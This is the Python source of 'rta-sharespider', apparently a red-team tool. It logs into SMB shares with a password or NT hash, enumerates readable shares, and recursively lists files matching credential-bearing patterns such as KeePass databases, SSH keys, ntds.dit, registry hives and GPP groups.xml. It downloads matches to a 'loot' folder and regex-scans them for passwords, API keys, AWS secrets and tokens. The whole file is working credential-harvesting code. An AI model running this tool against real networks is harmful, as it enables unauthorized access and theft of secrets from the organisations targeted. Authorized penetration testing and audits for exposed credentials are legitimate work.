#!/usr/bin/env python3
"""rta-sharespider — Recursively spider SMB shares for sensitive files.

Searches for passwords, configs, private keys, credential files, scripts
with hardcoded credentials, database connection strings, and other loot.

Usage:
  rta-sharespider -t 192.168.56.10 -u jsmith -p 'P@ssw0rd!' -d corp.local
  rta-sharespider -t 192.168.56.10 -u admin -H 'LM:NT' -d corp.local
  rta-sharespider -t targets.txt -u jsmith -p 'Pass' -d corp --depth 3
  rta-sharespider -t 192.168.56.10 -u jsmith -p 'Pass' -d corp --download
"""

import argparse
import json
import os
import re
import subprocess
import sys
from datetime import datetime
from pathlib import Path

# File patterns that are likely to contain credentials or sensitive data
INTERESTING_FILES = [
    # Credential files
    r"\.kdbx?$",           # KeePass databases
    r"\.pfx$",             # PKCS#12 certificates
    r"\.p12$",             # PKCS#12
    r"\.pem$",             # PEM certificates/keys
    r"\.key$",             # Private keys
    r"\.ppk$",             # PuTTY private keys
    r"\.rdg$",             # RDP connection files
    r"\.rdp$",             # RDP files (may contain password)
    r"id_rsa",             # SSH private keys
    r"id_ed25519",
    r"\.ssh.config$",

    # Configuration files
    r"web\.config$",       # .NET config (connection strings)
    r"app\.config$",
    r"appsettings.*\.json$",
    r"\.env$",             # Environment files
    r"\.env\..*$",
    r"wp-config\.php$",    # WordPress config
    r"config\.php$",
    r"settings\.py$",      # Django settings
    r"database\.yml$",     # Rails database config
    r"\.htpasswd$",        # Apache htpasswd
    r"\.netrc$",           # FTP credentials
    r"\.pgpass$",          # PostgreSQL credentials
    r"my\.cnf$",           # MySQL config
    r"\.my\.cnf$",

    # Scripts and automation
    r"\.ps1$",             # PowerShell scripts
    r"\.bat$",             # Batch files
    r"\.cmd$",
    r"\.vbs$",             # VBScript
    r"unattend\.xml$",     # Windows unattended install
    r"sysprep.*\.xml$",
    r"groups\.xml$",       # GPP passwords

    # Password and credential stores
    r"pass.*\.txt$",
    r"password.*\.(txt|csv|xlsx?)$",
    r"cred.*\.(txt|csv|xlsx?)$",
    r"secret.*\.txt$",
    r"login.*\.(txt|csv)$",
    r".*credential.*",
    r"ntds\.dit$",         # AD database
    r"SYSTEM$",            # Registry hive (for SAM/SECURITY)
    r"SAM$",
    r"SECURITY$",

    # VPN and network
    r"\.ovpn$",            # OpenVPN config
    r"\.conf$",            # Various configs

    # Documents that often contain credentials
    r".*password.*\.(docx?|xlsx?|pdf)$",
    r".*network.*diagram.*",
    r".*topology.*",
    r".*inventory.*\.(xlsx?|csv)$",
]

# Content patterns to search inside text files
CONTENT_PATTERNS = [
    (r"(?i)password\s*[:=]\s*\S+", "Password in config"),
    (r"(?i)passwd\s*[:=]\s*\S+", "Password in config"),
    (r"(?i)pwd\s*[:=]\s*\S+", "Password in config"),
    (r"(?i)connectionstring.*password", "DB connection string"),
    (r"(?i)data source.*password", "DB connection string"),
    (r"(?i)server=.*password=", "Connection string"),
    (r"(?i)api[_-]?key\s*[:=]\s*\S+", "API key"),
    (r"(?i)secret[_-]?key\s*[:=]\s*\S+", "Secret key"),
    (r"(?i)aws_access_key_id\s*=", "AWS key"),
    (r"(?i)aws_secret_access_key\s*=", "AWS secret"),
    (r"(?i)bearer\s+[a-zA-Z0-9\-_.]+", "Bearer token"),
    (r"(?i)authorization:\s*basic\s+", "Basic auth header"),
    (r"PRIVATE KEY", "Private key"),
    (r"(?i)net\s+use.*\/user:", "Net use with credentials"),
    (r"(?i)runas\s+\/user:", "RunAs with credentials"),
    (r"(?i)\$cred\s*=", "PowerShell credential variable"),
    (r"(?i)ConvertTo-SecureString", "PowerShell secure string"),
    (r"(?i)mysql.*-p\S+", "MySQL password in command"),
    (r"(?i)sqlcmd.*-P\s*\S+", "MSSQL password in command"),
]


def spider_share(target, share, username, domain, password=None, nthash=None,
                 depth=5, download_dir=None):
    """Spider a single SMB share using smbclient."""
    findings = []

    # Use smbclient to list files recursively
    cmd = ["smbclient", f"//{target}/{share}", "-N"]
    if domain:
        cmd += ["-W", domain]
    cmd += ["-U", username]
    if password:
        cmd[-1] = f"{username}%{password}"
    elif nthash:
        cmd += ["--pw-nt-hash"]
        cmd[-1] = f"{username}%{nthash}"

    # Recursive listing
    cmd += ["-c", f"recurse ON; prompt OFF; ls"]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        output = result.stdout
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return findings

    # Parse smbclient output for files
    current_dir = ""
    for line in output.split("\n"):
        # Directory change
        if line.startswith("\\"):
            current_dir = line.strip().rstrip("\\")
            continue

        # File entry: "  filename    A   12345  Mon Jan  1 00:00:00 2024"
        m = re.match(r"\s+(.+?)\s+[ADRHS]+\s+(\d+)\s+", line)
        if not m:
            continue

        filename = m.group(1).strip()
        filesize = int(m.group(2))

        if filename in (".", ".."):
            continue

        filepath = f"{current_dir}\\{filename}" if current_dir else filename
        full_path = f"\\\\{target}\\{share}\\{filepath}"

        # Check against interesting file patterns
        for pattern in INTERESTING_FILES:
            if re.search(pattern, filename, re.IGNORECASE):
                finding = {
                    "target": target,
                    "share": share,
                    "path": filepath,
                    "full_path": full_path,
                    "filename": filename,
                    "size": filesize,
                    "pattern": pattern,
                    "type": "filename_match",
                    "content_hits": [],
                }
                findings.append(finding)

                # Download small text files for content scanning
                if filesize < 1_000_000 and download_dir:
                    _download_and_scan(target, share, filepath, finding,
                                       username, domain, password, nthash,
                                       download_dir)
                break

    return findings


def _download_and_scan(target, share, filepath, finding, username, domain,
                       password, nthash, download_dir):
    """Download a file and scan its contents for credential patterns."""
    local_dir = Path(download_dir) / target / share
    local_dir.mkdir(parents=True, exist_ok=True)

    # Sanitize path for local storage
    local_filename = filepath.replace("\\", "_").replace("/", "_")
    local_path = local_dir / local_filename

    cmd = ["smbclient", f"//{target}/{share}", "-N"]
    if domain:
        cmd += ["-W", domain]
    cmd += ["-U", username]
    if password:
        cmd[-1] = f"{username}%{password}"
    elif nthash:
        cmd += ["--pw-nt-hash"]
        cmd[-1] = f"{username}%{nthash}"

    cmd += ["-c", f'get "{filepath}" "{local_path}"']

    try:
        subprocess.run(cmd, capture_output=True, timeout=30)
    except Exception:
        return

    if not local_path.exists():
        return

    finding["downloaded"] = str(local_path)

    # Scan text-like files for credential patterns
    text_extensions = {".txt", ".xml", ".config", ".json", ".yml", ".yaml",
                       ".ini", ".conf", ".env", ".ps1", ".bat", ".cmd",
                       ".vbs", ".py", ".php", ".asp", ".aspx", ".sh",
                       ".csv", ".log", ".properties", ".cfg"}

    ext = Path(finding["filename"]).suffix.lower()
    if ext not in text_extensions:
        return

    try:
        content = local_path.read_text(errors="replace")
        for pattern, description in CONTENT_PATTERNS:
            matches = re.findall(pattern, content)
            if matches:
                for match in matches[:5]:  # limit matches per pattern
                    finding["content_hits"].append({
                        "pattern": description,
                        "match": match[:100],  # truncate
                    })
    except Exception:
        pass


def enumerate_shares(target, username, domain, password=None, nthash=None):
    """List readable shares on a target."""
    cmd = ["netexec", "smb", target]
    if domain:
        cmd += ["-d", domain]
    cmd += ["-u", username]
    if password:
        cmd += ["-p", password]
    elif nthash:
        cmd += ["-H", nthash]
    cmd += ["--shares"]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return []

    shares = []
    for line in result.stdout.split("\n"):
        # Look for share names with READ access
        m = re.search(r"\s+(\S+)\s+READ", line)
        if m:
            share_name = m.group(1)
            if share_name not in ("IPC$", "print$"):
                shares.append(share_name)

    return shares


def print_findings(findings):
    if not findings:
        print("  [-] No interesting files found.")
        return

    print(f"\n  [+] Found {len(findings)} interesting files:\n")

    for f in findings:
        icon = "***" if f.get("content_hits") else "   "
        size_str = f"{f['size']:>10,}" if f["size"] else "       ???"
        print(f"  {icon} {f['full_path']}")
        print(f"       Size: {size_str}  Pattern: {f['pattern']}")
        if f.get("content_hits"):
            for hit in f["content_hits"]:
                print(f"       >>> {hit['pattern']}: {hit['match']}")
        if f.get("downloaded"):
            print(f"       Downloaded: {f['downloaded']}")
        print()


def main():
    parser = argparse.ArgumentParser(description="RTA Share Spider — find credentials in SMB shares")
    parser.add_argument("-t", "--target", required=True, help="Target IP or file with IPs")
    parser.add_argument("-u", "--username", required=True)
    parser.add_argument("-p", "--password", default=None)
    parser.add_argument("-H", "--hash", default=None, help="NT hash")
    parser.add_argument("-d", "--domain", default="")
    parser.add_argument("--depth", type=int, default=5, help="Recursion depth")
    parser.add_argument("--shares", nargs="*", help="Specific shares (default: auto-discover)")
    parser.add_argument("--download", action="store_true", help="Download and scan file contents")
    parser.add_argument("--download-dir", default="./loot", help="Download directory")
    parser.add_argument("-o", "--output", help="Save results to JSON file")
    args = parser.parse_args()

    # Get targets
    targets = []
    if os.path.isfile(args.target):
        with open(args.target) as f:
            targets = [line.strip() for line in f if line.strip()]
    else:
        targets = [args.target]

    all_findings = []

    for target in targets:
        print(f"\n  [*] Spidering {target}")

        # Enumerate shares
        if args.shares:
            shares = args.shares
        else:
            print(f"  [>] Enumerating shares...")
            shares = enumerate_shares(target, args.username, args.domain,
                                       args.password, args.hash)
            if not shares:
                print(f"  [-] No readable shares found")
                continue
            print(f"  [+] Found {len(shares)} readable shares: {', '.join(shares)}")

        # Spider each share
        for share in shares:
            print(f"  [>] Spidering \\\\{target}\\{share}...")
            download_dir = args.download_dir if args.download else None
            findings = spider_share(
                target, share, args.username, args.domain,
                args.password, args.hash, args.depth, download_dir,
            )
            all_findings.extend(findings)

    # Print results
    print_findings(all_findings)

    # Summary
    content_hits = sum(1 for f in all_findings if f.get("content_hits"))
    print(f"  [*] Total: {len(all_findings)} interesting files, "
          f"{content_hits} with credential content")

    # Save to file
    if args.output:
        with open(args.output, "w") as f:
            json.dump(all_findings, f, indent=2)
        print(f"  [+] Results saved to {args.output}")


if __name__ == "__main__":
    main()
